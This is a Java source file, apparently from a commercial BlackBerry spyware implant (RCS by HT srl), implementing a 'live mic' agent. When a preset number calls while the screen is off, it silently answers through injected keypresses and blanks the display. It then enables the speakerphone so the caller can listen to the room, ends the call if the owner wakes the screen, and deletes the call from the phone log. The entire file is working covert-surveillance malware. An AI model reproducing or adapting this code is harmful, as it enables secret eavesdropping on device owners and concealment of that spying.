//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : LiveMicAgent.java
 * Created      : 2-lug-2010
 * *************************************************/
package blackberry.agent;

import java.io.EOFException;
import java.util.Date;

import net.rim.blackberry.api.phone.phonelogs.CallLog;
import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.util.DataBuffer;
import blackberry.AppListener;
import blackberry.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.KeyInjector;
import blackberry.injection.MenuWalker;
import blackberry.interfaces.BacklightObserver;
import blackberry.interfaces.CallListObserver;
import blackberry.interfaces.PhoneCallObserver;
import blackberry.log.Log;
import blackberry.log.LogType;
import blackberry.utils.Check;
import blackberry.utils.WChar;

/**
 * The Class LiveMicAgent.
 */
public class LiveMicAgent extends Agent implements PhoneCallObserver,
        BacklightObserver, CallListObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug("LiveMicAgent", DebugLevel.VERBOSE);
    //#endif

    String number;
    int volume;
    boolean autoanswer;
    boolean suspended;

    /**
     * Instantiates a new live mic agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public LiveMicAgent(final boolean agentEnabled) {

        super(Agent.AGENT_LIVE_MIC, agentEnabled, Conf.AGENT_LIVEMIC_ON_SD,
                "LiveMicAgent");

        //#ifndef LIVE_MIC_ENABLED
        enable(false);
        //#endif

        //#ifdef DBC
        Check.asserts(Log.convertTypeLog(agentId) == LogType.NONE,
                "Wrong Conversion");
        //#endif
    }

    /**
     * Instantiates a new live mic agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    public LiveMicAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        final DataBuffer databuffer = new DataBuffer(confParameters, 0,
                confParameters.length, false);
        try {
            final int len = databuffer.readInt();
            final byte[] array = new byte[len];
            databuffer.read(array);
            number = WChar.getString(array, true);

        } catch (final EOFException e) {
            return false;
        }

        //#ifdef DEBUG_INFO
        debug.info("Tapping number: " + number);
        //#endif
        return true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    protected void actualStart() {
        AppListener.getInstance().addPhoneCallObserver(this);
        backlight = Backlight.isEnabled();
        AppListener.getInstance().addBacklightObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    protected void actualStop() {
        AppListener.getInstance().removePhoneCallObserver(this);
        AppListener.getInstance().removeBacklightObserver(this);

        suspendPainting(false);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {
    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.PhoneCallObserver#onCallAnswered(java.lang.String)
     */
    public synchronized void onCallAnswered(final int callId,
            final String phoneNumber) {
        //#ifdef DBC
        Check.requires(phoneNumber != null, "onCallIncoming: phoneNumber null");
        //#endif

        //#ifdef DEBUG_INFO
        debug.info("    === callAnswered: " + phoneNumber + "===");
        //#endif

        if (!interestingNumber(callId, phoneNumber)) {
            return;
        }

        //MenuWalker.walk(new String[] { "Activate Speakerphone" });
        MenuWalker.walk(new String[] { "Home Screen", "Return to Phone" });

        //MenuWalker.walk(new String[] { "Close" });
        MenuWalker.walk(new String[] { "Return to Phone" });
        MenuWalker.walk(new String[] { "Activate Speakerphone" });

        //#ifdef DEBUG_TRACE
        debug.trace("onCallAnswered: finished");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.PhoneCallObserver#onCallConnected(java.lang.String)
     */
    public synchronized void onCallConnected(final int callId,
            final String phoneNumber) {
        //#ifdef DBC
        Check.requires(phoneNumber != null, "onCallIncoming: phoneNumber null");
        //#endif

        //#ifdef DEBUG_INFO
        debug.info("    === callConnected: " + phoneNumber + " ===");
        //#endif      

        if (!interestingNumber(callId, phoneNumber)) {
            return;
        }

        Backlight.enable(false);
        suspendPainting(false);
        autoanswer = true;
    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.PhoneCallObserver#onCallDisconnected(java.lang.
     * String)
     */
    public synchronized void onCallDisconnected(final int callId,
            final String phoneNumber) {

        //#ifdef DEBUG_INFO
        debug.info("======= callDisconnected: " + phoneNumber + " =======");
        //#endif

        autoanswer = false;

        if (!interestingNumber(callId, phoneNumber)) {
            //#ifdef DEBUG_TRACE
            debug.trace("onCallDisconnected: not interesting");
            //#endif
            return;
        } else {
            //#ifdef DEBUG_TRACE
            debug.trace("onCallDisconnected, interesting");
            //#endif
        }

        suspendPainting(false);

    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.PhoneCallObserver#onCallIncoming(java.lang.String)
     */
    public synchronized void onCallIncoming(final int callId,
            final String phoneNumber) {

        //#ifdef DBC
        Check.requires(phoneNumber != null, "onCallIncoming: phoneNumber null");
        //#endif

        //#ifdef DEBUG_INFO
        debug.info("======= incoming: " + phoneNumber + " =======");
        //#endif

        if (!interestingNumber(callId, phoneNumber)) {
            return;
        }

        suspendPainting(true);

        if (backlight) {
            //#ifdef DEBUG_INFO
            debug.info("Backlight enabled, killing incoming call");
            //#endif
            KeyInjector.pressKey(Keypad.KEY_END);
        } else {
            //#ifdef DEBUG_INFO
            debug.info("Backlight disabled, accepting incoming call");
            //#endif
            KeyInjector.pressKey(Keypad.KEY_SEND);
        }

    }
    

    public void onCallInitiated(int callId, String phoneNumber) {
        // TODO Auto-generated method stub
        
    }

    boolean backlight;

    /*
     * (non-Javadoc)
     * @see blackberry.interfaces.BacklightObserver#onBacklightChange(boolean)
     */
    public synchronized void onBacklightChange(final boolean statusOn) {
        if (autoanswer && statusOn) {
            autoanswer = false;
            //#ifdef DEBUG_TRACE
            debug.trace("onBacklightChange: sending END");
            //#endif
            suspendPainting(true);

            KeyInjector.pressKey(Keypad.KEY_END);
            //Utils.sleep(2000);

            suspendPainting(false);
        }
        backlight = statusOn;
    }

    /**
     * Suspend/resume painting.
     * 
     * @param suspend
     *            true if you ask to suspend
     */
    private void suspendPainting(final boolean suspend) {
        if (!Conf.IS_UI) {
            //#ifdef DEBUG_WARN
            debug.warn("Not UI");
            //#endif
            return;
        }

        //#ifdef DEBUG_TRACE
        debug.trace("suspendPainting: " + suspend + " suspended: " + suspended);
        //#endif              

        synchronized (Application.getEventLock()) {
            if (suspended != suspend) {
                try {
                    //#ifdef LIVE_MIC_ENABLED
                    UiApplication.getUiApplication().suspendPainting(suspend);
                    //#endif
                } catch (IllegalStateException ex) {
                    //#ifdef DEBUG_ERROR
                    debug.error(ex);
                    //#endif
                }
                suspended = suspend;
            }
        }
    }

    /**
     * true if the phoneArgument matches the configured one
     * 
     * @param phoneNumber
     * @return
     */
    private boolean interestingNumber(int callId, final String phoneNumber) {

        //#ifdef DBC
        Check.asserts(phoneNumber != null,
                "interestingNumber: phoneNumber==null");
        //#endif

        if (!phoneNumber.endsWith(number)) {
            //#ifdef DEBUG_TRACE
            debug.trace("onCallIncoming, don't tap: " + phoneNumber + " != "
                    + number);
            //#endif
            return false;
        } else {
            if (phoneNumber != null) {
                //#ifdef DEBUG_TRACE
                debug.trace("callingHistory adding callId: " + callId);
                //#endif                
            }
            return true;
        }

    }

    public void callLogAdded(String number, String name, Date date,
            int duration, boolean outgoing, boolean missed) {
        PhoneLogs phoneLogs = PhoneLogs.getInstance();
        int num = phoneLogs.numberOfCalls(PhoneLogs.FOLDER_NORMAL_CALLS);
        for (int i = 0; i < num; i++) {
            CallLog log = phoneLogs.callAt(i, PhoneLogs.FOLDER_NORMAL_CALLS);

            if (date.getTime() == log.getDate().getTime()) {
                //#ifdef DEBUG_TRACE
                debug.trace("deleting date: " + log.getDate());
                //#endif 
                phoneLogs.deleteCall(i, PhoneLogs.FOLDER_NORMAL_CALLS);
                break;
            }
        }

        int newnum = phoneLogs.numberOfCalls(PhoneLogs.FOLDER_NORMAL_CALLS);
        //#ifdef DEBUG_TRACE
        //debug.trace("num: " + num + " after delete:" + newnum);
        //#endif
    }


}
